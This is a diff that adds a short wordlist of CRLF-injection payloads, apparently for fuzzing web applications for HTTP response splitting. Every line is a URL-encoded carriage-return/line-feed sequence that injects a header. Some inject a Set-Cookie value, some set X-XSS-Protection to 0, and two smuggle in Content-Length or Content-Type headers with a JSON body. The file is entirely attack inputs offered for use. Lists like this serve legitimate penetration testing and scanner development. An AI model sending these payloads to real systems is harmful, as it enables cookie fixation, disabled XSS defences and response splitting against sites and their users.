@@ -1,0 +1,8 @@
+%0aSet-Cookie:crlf=injection
+%0d%0aSet-Cookie:crlf=injection
+%0dSet-Cookie:crlf=injection
+%0aX-XSS-Protection:0
+%0d%0aX-XSS-Protection:0
+%0dX-XSS-Protection:0
+%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0
+%0d%0aContent-Type:application/json%0d%0a%0d%0a{"id":1}
